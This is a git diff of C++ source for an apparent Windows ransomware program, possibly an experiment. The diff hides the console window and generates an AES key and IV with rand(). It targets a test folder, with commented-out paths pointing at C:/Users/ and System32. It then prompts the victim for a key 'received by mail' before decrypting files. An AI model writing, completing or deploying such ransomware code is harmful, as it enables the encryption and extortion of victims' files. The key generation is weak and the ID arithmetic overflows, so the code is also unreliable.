@@ -6,6 +6,7 @@
 #include <string>
 #include <iostream>
 #include <openssl\err.h>
+#include <openssl/rand.h>
 //libcurl
 #include <curl\curl.h>
 #include <experimental/filesystem> // C++-standard header file name  
@@ -27,41 +28,43 @@ int send_encrypted_msg(const unsigned char* cypher, const unsigned char* pubkey,
 using namespace std;
 
 
-void HideConsole()
-{
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
-}
-
-void ShowConsole()
-{
-	ShowWindow(GetConsoleWindow(), SW_SHOW);
-}
-
-bool IsConsoleVisible()
-{
-	return (IsWindowVisible(GetConsoleWindow()) != FALSE);
-}
-
-
 
 int main() {
 	/* hide the console */ 
-	HideConsole();
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	/* initialize random seed */
 	srand(time(NULL));
 	/* generate the client ID */
 	int id = rand() % 10000000000000000;
 
-	/* the key for the AES encryption */
-	unsigned char AES_key[] = "12345678901234561234567890123456";// 32 char 256bit key
-	unsigned char iv[] = "1234567890123456";//same size as block 16 char 128 bit block
+	/* generate the AES keys */
+	unsigned char AES_key[32], iv[16];
+	static const char alphanum[] =
+		"0123456789"
+		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+		"abcdefghijklmnopqrstuvwxyz";
+
+	for (int i = 0; i < 32; ++i) {
+		AES_key[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+	}
+
+	for (int i = 0; i < 16; ++i) {
+		iv[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+	}
+
+	AES_key[31] = 0;
+	iv[15] = 0;
+
+	cout << "aes = " << AES_key << endl;
+	cout << "iv = " << iv << endl;
 
 
 	/* directory to encrypt */
-	//const char* path = "C:/Users/quentin/Desktop/test_ransom/";
+	
 	const char* path = "C:/test_ransom/";
 	/* == dangerous line == */
+	//const char* path = "C:/Users/";
 	//const char* path = "C:/Windows/System32/";
 	
 
@@ -104,7 +107,7 @@ int main() {
 	}
 
 	/* show the console for the instructions */
-	ShowConsole();
+	ShowWindow(GetConsoleWindow(), SW_SHOW);
 	string input;
 	string key((char*)AES_key);
 	BOOL OK_decrypt = false;
@@ -130,7 +133,8 @@ int main() {
 
 		std::cout << "insert the key you received by mail :  ";
 		std::getline(cin, input);
-
+		//cout << input << endl;
+		//cout << key << endl;
 
 		if (input == key) {
 			OK_decrypt = true;
